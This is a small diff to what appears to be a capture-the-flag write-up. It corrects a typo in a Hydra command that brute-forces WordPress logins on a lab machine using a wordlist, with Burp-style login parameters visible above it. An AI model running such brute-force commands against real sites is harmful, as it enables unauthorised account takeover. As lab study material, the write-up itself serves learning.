@@ -37,7 +37,7 @@ log=§admin§&pwd=§admin§&wp-submit=§Log+In§&redirect_to=§https%3A%2F%2F10.
 
 WordPress - Hydra input
 ```shell
-hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd^PWD^:Invaild username" -t 30
+hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd^PWD^:Invalid username" -t 30
 
 ```
 
